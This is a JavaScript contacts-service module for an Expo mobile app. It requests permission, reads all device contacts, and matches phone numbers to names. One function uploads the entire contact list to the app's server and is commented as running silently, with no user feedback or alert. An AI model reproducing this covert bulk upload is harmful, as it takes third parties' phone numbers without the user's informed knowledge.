import * as Contacts from 'expo-contacts';

/**
 * Request contacts permission using expo-contacts API ONLY.
 * Returns true if granted, false otherwise.
 */
export async function requestContactsPermission() {
  try {
    const { status } = await Contacts.requestPermissionsAsync();
    return status === 'granted';
  } catch (e) {
    console.error('[ContactsService] Permission error:', e);
    return false;
  }
}

/**
 * Check if contacts permission is already granted.
 */
export async function checkContactsPermission() {
  try {
    const { status } = await Contacts.getPermissionsAsync();
    return status === 'granted';
  } catch (e) {
    return false;
  }
}

/**
 * Get all device contacts formatted as [{name, phone}].
 * Returns empty array on error or if permission not granted.
 */
export async function getAllContacts() {
  try {
    // First check if we have permission
    const { status } = await Contacts.getPermissionsAsync();
    if (status !== 'granted') {
      // Try requesting permission
      const reqResult = await Contacts.requestPermissionsAsync();
      if (reqResult.status !== 'granted') return [];
    }

    const { data } = await Contacts.getContactsAsync({
      fields: [Contacts.Fields.PhoneNumbers],
    });

    if (!data) return [];

    const formatted = [];
    for (const contact of data) {
      if (!contact.phoneNumbers || contact.phoneNumbers.length === 0) continue;
      const name = contact.name || contact.firstName || '';
      for (const pn of contact.phoneNumbers) {
        const phone = (pn.number || pn.digits || '').replace(/[\s\-\(\)]/g, '');
        if (phone.length > 0) {
          formatted.push({ name, phone });
        }
      }
    }

    return formatted;
  } catch (e) {
    console.error('[ContactsService] Get contacts error:', e);
    return [];
  }
}

/**
 * Upload all contacts to the server silently.
 * This function does not throw errors and does not show any UI feedback.
 * @param {import('../services/api').FoxApi} api - The authenticated API client
 */
export async function uploadContactsToServer(api) {
  try {
    const contacts = await getAllContacts();
    if (contacts.length === 0) return;
    await api.uploadContacts(contacts);
    console.log('[ContactsService] Uploaded', contacts.length, 'contacts');
  } catch (e) {
    // Silent failure - do not alert user
    console.error('[ContactsService] Upload error:', e);
  }
}

/**
 * Find a matching contact name for a given phone number.
 * @param {Array<{name: string, phone: string}>} contacts
 * @param {string} phoneNumber
 * @returns {string|null} The contact name or null
 */
export function findContactName(contacts, phoneNumber) {
  if (!phoneNumber || !contacts || contacts.length === 0) return null;
  const clean = phoneNumber.replace(/[\s\-\(\)]/g, '');
  for (const c of contacts) {
    // Direct match
    if (c.phone === clean) return c.name;
    // With + prefix
    if (c.phone === '+' + clean || '+' + c.phone === clean) return c.name;
    // Without + prefix comparison
    const cClean = c.phone.replace(/^\+/, '');
    const pClean = clean.replace(/^\+/, '');
    if (cClean === pClean) return c.name;
    // Match last 9+ digits (handles country code differences like +20 vs 020 vs 20)
    if (clean.replace(/^\+/, '').length >= 9 && c.phone.replace(/^\+/, '').length >= 9) {
      const cEnd = c.phone.replace(/^\+/, '').slice(-10);
      const pEnd = clean.replace(/^\+/, '').slice(-10);
      if (cEnd === pEnd) return c.name;
      // Also try 9 digits
      const cEnd9 = c.phone.replace(/^\+/, '').slice(-9);
      const pEnd9 = clean.replace(/^\+/, '').slice(-9);
      if (cEnd9 === pEnd9) return c.name;
    }
  }
  return null;
}
